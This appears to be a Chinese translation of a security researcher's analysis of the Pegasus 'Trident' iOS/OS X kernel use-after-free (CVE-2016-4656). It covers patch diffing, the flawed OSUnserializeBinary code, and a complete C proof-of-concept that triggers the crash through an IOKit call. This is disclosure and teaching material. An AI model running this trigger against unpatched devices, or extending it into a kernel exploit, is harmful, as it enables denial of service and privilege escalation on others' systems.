@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>三叉戟漏洞原理分析及Poc</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>三叉戟漏洞原理分析及Poc</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458279494&amp;idx=1&amp;sn=87f93d1b417b2a63c341583e72c08105&amp;chksm=b1816ecc86f6e7da9bca5e743f8b5b49c997e38721d55eeee8aa9d7df53363057f65803a68f6&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458279494&amp;idx=1&amp;sn=87f93d1b417b2a63c341583e72c08105&amp;chksm=b1816ecc86f6e7da9bca5e743f8b5b49c997e38721d55eeee8aa9d7df53363057f65803a68f6&amp;scene=27#wechat_redirect</a></blockquote><p><strong>【翻译】Pegasus三叉戟漏洞原理分析及Poc（CVE-2016-4656）</strong></p><p><strong><br/></strong></p><p><strong>前言</strong></p><p><br/></p><p style="text-indent: 2em;">由于间谍套装Pegasus的出现，2016年8月25日苹果发布了iOS 9.3.5安全更新来封堵其所使用的三叉戟漏洞。与其他木马不同，这套间谍套装内置了三个零日漏洞来获得手机的完整权限。由于Citizen Lab和Lookout团队（漏洞的发现者）和苹果决定将此事彻底掩埋，公众对漏洞的详情知之甚少。到现在为止他们甚至都没有放出捕获的样本，因此任何第三方都没有可能进行分析。</p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;">我们团队（SektionEins）认为既然漏洞已经补上了，就不应该继续封堵漏洞的细节。所以我们决定从苹果放出的补丁中，分析一下Pegasus所使用的漏洞细节。<br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><strong>分析补丁</strong></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;">不幸的是研究iOS补丁并不是我们想象的那么容易，iOS 9 的内核是以加密的形式存储的，想要拿到一份解密的内核镜像，要么手上有一个低权限的漏洞允许解密内核，要么就得直接jailbreak目标系统然后把内核dump下来。最终我们决定用我们自己手上的漏洞把9.3.4和9.3.5都jailbreak了，然后把内核dump下来。我们一般使用Mathew Solnik（注释1）的方法，他的方法可以把内核从物理内存里完整的dump下来。</p><p style="text-indent: 2em;">两份内核都dump下来之后，我们就开始分析不同之处。我们使用了IDA的一个开源二进制找不同插件Diaphora（注释2）来完成这项工作。我们把iOS 9.3.4载入进IDA，等自动分析完成之后，用Diaphora把IDA的数据库转化成Diaphora使用的SQLITE数据库。然后重复iOS 9.3.5，然后让Diaphora来分析不同之处。结果见下图：<br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/></p><p><a rel="Lightbox_1443709" target="_blank"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8Gfy6CKpTNg9omibTxbaH1czacx77KYZ6uSz8bghrChMHPcpDAyE3ic1eTua2AL1SEykN6PofqUCmqA/0?wx_fmt=png" class="thumbnail" border="0" title="点击图片以查看大图&#10;&#10;图片名称:&#9;diaphora1.png&#10;查看次数:&#9;3&#10;文件大小:&#9;280.4 KB&#10;文件 ID :&#9;106753" style="margin: 2px;" data-type="png" data-ratio="0.435" data-w="600" src="../Images/f79873ee2c1928229c4e7be92c83d668.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8Gfy6CKpTNg9omibTxbaH1czacx77KYZ6uSz8bghrChMHPcpDAyE3ic1eTua2AL1SEykN6PofqUCmqA/0?wx_fmt=png"/></a></p><p><br/></p><p style="text-indent: 2em;">Diaphora发现了iOS 9.3.5中一些改变了的函数，然而大多只是改变了跳转地址。从这些改变中可以看出，最有趣的地方在于OSUnserializeXML这个函数。分析到这个函数非常困难，因为从9.3.4到9.3.5发生了非常大的变化。然而后续分析却发现这个函数实际上是inline了其他函数，还不如直接去看这个函数的源代码，因为XNU是开源的。OS X 的10.11.6版本内核XNU在这里可以看到：opensource.apple.com。</p><p style="text-indent: 2em;">看到代码之后发现这个函数其实inline了这个函数：OSUnserializeBinary<br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><br/></p><pre dir="ltr"><span style="font-size: 12px;">OSObject*
+OSUnserializeXML(const char *buffer, size_t bufferSize, OSString **errorString)
+{
+        if (!buffer) return (0);
+        if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (0);
+        if (!strcmp(kOSSerializeBinarySignature, buffer)) return OSUnserializeBinary(buffer, bufferSize, errorString);
+
+        // XML must be null terminated
+        if (buffer[bufferSize - 1]) return 0;
+        return OSUnserializeXML(buffer, errorString);
+}</span></pre><p><br/></p><p><strong>OSUnserializeBinary</strong></p><p style="text-indent: 2em;">这个函数还是相对比较新的，添加到OSUnserializeXML函数里来处理序列化二进制数据的，所以某种程度上暴露给用户了。这意味着攻击者可以通过调用IOKit API（或者Mach API）等使用序列化输入参数的接口，来肆意测试这个函数，举个例子IOKit里的mathing函数。</p><p style="text-indent: 2em;">这同样意味着，iOS平台的沙盒中的应用，以及OS X平台的应用，均可以以用户态直接发起攻击。</p><p style="text-indent: 2em;">这个新函数的代码在libkern/c++/OSSerializeBinary.cpp中，既然问题出在这里我们就不去看苹果究竟补丁打在哪儿了。新的序列化二进制格式并不特别复杂，它包含一个32位的定位头，然后是32位的对齐标志位，后面是数据。</p><p style="text-indent: 2em;">支持下列数据格式：<br/></p><pre dir="ltr"><span style="font-size: 12px;"># Dictionary
+# Array
+# Set
+# Number
+# Symbol
+# String
+# Data
+# Boolean
+# Object (reference to previously deserialized object)</span></pre><p style="text-indent: 2em;">这种二进制格式把上述数据编码进32位块的24~30位，低的24位预留存储数字（比如长度、集合元素计数器等），31位标记集合里最后一个元素，并且所有的其他元素（字符串、符号、二进制数据、RAW数据）都按照4个字节对齐的方式进入数据流里，详情请看最后的Poc。<br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><strong>漏洞实质</strong></p><p style="text-indent: 2em;">最终感觉把这个漏洞定位出来并不是很难，因为它看上去非常像一个我们曾经在PHP.net发现的unserialize()函数中的UAF漏洞。OSUnserialize（）函数貌似也是出了同样的问题：反序列器在反序列的过程中会创建一个向已释放对象的引用。</p><p style="text-indent: 2em;">一个对象在反序列化的过程中会被加入一个表中，代码如下：<br/></p><pre dir="ltr"><span style="font-size: 12px;">if (!isRef)
+{
+        setAtIndex(objs, objsIdx, o);
+        if (!ok) break;
+        objsIdx++;
+}</span></pre><p style="text-indent: 2em;">这样做并不安全，PHP也犯了同样的错误，setAtIndex（）宏并不增加对象的引用计数：</p><pre dir="ltr"><span style="font-size: 12px;">define setAtIndex(v, idx, o)   
+        if (idx &gt;= v##Capacity)                                                   {   
+            uint32_t ncap = v##Capacity + 64;                         <br/>           typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));
+                if (!nbuf) ok = false;     
+                if (v##Array)    
+                {        
+                        bcopy(v##Array, nbuf, v##Capacity * sizeof(o));   
+                        kfree(v##Array, v##Capacity * sizeof(o));         
+                }                                                                 
+                v##Array    = nbuf;                                  
+                v##Capacity = ncap;                                                 
+        }                                                  
+        if (ok) v##Array[idx] = o;   &lt;---- remember object WITHOUT COUNTING THE REFERENCE</span></pre><p style="text-indent: 2em;">如果反序列化的过程中没办法合法释放对象的话，v##Array不保留引用计数就没关系，不幸的是至少有一处代码允许了反序列化时释放对象，下文的代码是OSSymbols和OSString的处理字典对象的过程。OSString keys转换为OSSymbol的过程中OSString不复存在，然而OSString已经被加入了对象列表里面了。</p><p><br/></p><pre dir="ltr"><span style="font-size: 12px;">if (dict)
+{
+        if (sym)
+        {
+                DEBG("%s = %s\n", sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());
+                if (o != dict) ok = dict-&gt;setObject(sym, o, true);
+                o-&gt;release();
+                sym-&gt;release();
+                sym = 0;
+        }
+        else
+        {
+                sym = OSDynamicCast(OSSymbol, o);
+                if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))
+                {
+                    sym = (OSSymbol *) OSSymbol::withString(str);
+                    o-&gt;release();  &lt;---- destruction of OSString object that is already in objs table
+                    o = 0;
+                }
+                ok = (sym != 0);
+        }
+}</span></pre><p style="text-indent: 2em;">这样就尴尬了，我们只要使用kOSSerializeObject类型去引用已经被释放了的OSString，就崩溃了。这是个经典的UAF（Use After Free）漏洞。<br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><strong>PoC</strong></p><p style="text-indent: 2em;">既然已经研究好了问题在哪里，我们写了一个简单的Poc来发动同样的攻击。大家可以在OS X 里尝试一下（因为原理和iOS是一样的）。</p><p><br/></p><pre dir="ltr"><span style="font-size: 12px;">/*
+ * Simple POC to trigger CVE-2016-4656 (C) Copyright 2016 Stefan Esser / SektionEins GmbH
+ * compile on OS X like:
+ *    gcc -arch i386 -framework IOKit -o ex exploit.c
+ */
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;mach/mach.h&gt;
+#include &lt;IOKit/IOKitLib.h&gt;
+#include &lt;IOKit/iokitmig.h&gt;
+
+enum
+{
+  kOSSerializeDictionary   = 0x01000000U,
+  kOSSerializeArray        = 0x02000000U,
+  kOSSerializeSet          = 0x03000000U,
+  kOSSerializeNumber       = 0x04000000U,
+  kOSSerializeSymbol       = 0x08000000U,
+  kOSSerializeString       = 0x09000000U,
+  kOSSerializeData         = 0x0a000000U,
+  kOSSerializeBoolean      = 0x0b000000U,
+  kOSSerializeObject       = 0x0c000000U,
+  kOSSerializeTypeMask     = 0x7F000000U,
+  kOSSerializeDataMask     = 0x00FFFFFFU,
+  kOSSerializeEndCollecton = 0x80000000U,
+};
+
+#define kOSSerializeBinarySignature "\323\0\0"
+
+int main()
+{
+  char * data = malloc(1024);
+  uint32_t * ptr = (uint32_t *) data;
+  uint32_t bufpos = 0;
+  mach_port_t master = 0, res;
+  kern_return_t kr;
+
+  /* create header */
+  memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
+  bufpos += sizeof(kOSSerializeBinarySignature);
+
+  /* create a dictionary with 2 elements */
+  *(uint32_t *)(data+bufpos) = kOSSerializeDictionary | kOSSerializeEndCollecton | 2; bufpos += 4;
+  /* our key is a OSString object */
+  *(uint32_t *)(data+bufpos) = kOSSerializeString | 7; bufpos += 4;
+  *(uint32_t *)(data+bufpos) = 0x41414141; bufpos += 4;
+  *(uint32_t *)(data+bufpos) = 0x00414141; bufpos += 4;
+  /* our data is a simple boolean */
+  *(uint32_t *)(data+bufpos) = kOSSerializeBoolean | 64; bufpos += 4;
+  /* now create a reference to object 1 which is the OSString object that was just freed */
+  *(uint32_t *)(data+bufpos) = kOSSerializeObject | 1; bufpos += 4;
+
+  /* get a master port for IOKit API */
+  host_get_io_master(mach_host_self(), &amp;master);
+  /* trigger the bug */
+  kr = io_service_get_matching_services_bin(master, data, bufpos, &amp;res);
+  printf("kr: 0x%x\n", kr);
+}</span></pre><p><br/></p><p><strong>攻击套件</strong></p><p style="text-indent: 2em;">我们刚刚分析完了代码和问题，还没有开发攻击套件。我们会开发的，并且在下次的培训（注释3）上以这个为案例讲一下。<br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><span style="font-size: 11px;">原文：</span><a target="_blank" style="font-size: 11px; text-decoration: underline;"><span style="font-size: 11px;">http://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html</span></a><br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><span style="font-size: 11px;">注释1：</span><a target="_blank" style="font-size: 11px; text-decoration: underline;"><span style="font-size: 11px;">http://blog.offcellresearch.com/security/apple/ios/kernel/2016/08/23/who-needs-decrypted-kernels-anyways.html</span></a><br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><span style="font-size: 11px;">注释2：</span><a target="_blank" style="font-size: 11px; text-decoration: underline;"><span style="font-size: 11px;">https://github.com/joxeankoret/diaphora</span></a><br style="color: rgb(19, 37, 60); font-family: 微软雅黑; font-size: large; line-height: 29.1599998474121px; white-space: normal; background-color: rgb(245, 245, 245);"/><span style="font-size: 11px;">注释3：</span><a target="_blank" style="font-size: 11px; text-decoration: underline;"><span style="font-size: 11px;">https://www.sektioneins.de/en/blog/16-08-04-trainingBerlin.html</span></a></p><p><br/></p><p style="line-height: 25.6000003814697px;"><span style="font-size: 14px;">看雪众测：</span><a target="_blank" data_ue_src="http://" style="text-decoration: underline; font-size: 14px;">http://ce.kanxue.com</a></p><p style="line-height: 25.6000003814697px;"><span style="font-size: 14px;">看雪论坛：</span><a target="_blank" data_ue_src="http://" style="text-decoration: underline; font-size: 14px;">http://bbs.pediy.com/</a></p><p style="line-height: 25.6000003814697px;"><span style="font-size: 14px;">     </span><img data-s="300,640" data-type="png" data-ratio="1" data-w="90" width="auto" data-src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8FukI98ZmiaXDQn1XUiawIEDK0icchNYW3SzicqdBOXJdTmSa4Fhb1IsDiabpClrmMGpJJwDKS8Zu7fJQg/640?wx_fmt=png" style="box-sizing: border-box !important; word-wrap: break-word !important; width: auto !important; visibility: visible !important;" src="../Images/bc7d28d65f49361aa24372f76018815b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8FukI98ZmiaXDQn1XUiawIEDK0icchNYW3SzicqdBOXJdTmSa4Fhb1IsDiabpClrmMGpJJwDKS8Zu7fJQg/640?wx_fmt=png"/></p><p style="line-height: 25.6000003814697px;"><span style="font-size: 14px;">-----微信ID：ikanxue-----</span></p><p style="line-height: 25.6000003814697px;"><span style="font-size: 14px;">看雪学院，致力于安全研究16年！</span></p><p><br/></p>
+        
+</body>
+</html>
